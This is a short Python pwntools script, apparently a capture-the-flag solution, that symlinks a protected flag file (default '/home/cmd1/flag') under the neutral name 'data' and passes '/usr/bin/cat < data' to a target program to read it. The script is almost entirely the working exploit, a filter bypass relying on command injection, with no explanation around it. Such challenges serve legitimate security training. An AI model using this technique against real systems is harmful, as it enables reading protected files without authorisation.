#!/usr/bin/env python
import pwn
import tempfile
import os
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
parser.add_argument("flag", type=str, help="The name of the flag to process, for testing", default='/home/cmd1/flag')
args = parser.parse_args()

tmpdir = tempfile.mkdtemp()
cwd = os.getcwd()
os.chdir(tmpdir)
os.symlink(f'{args.flag}', 'data')
p = pwn.process([f'{args.filename}', '/usr/bin/cat < data'])
print(p.recvall())
p.close()

os.remove('data')
os.chdir(cwd)
os.rmdir(tmpdir)
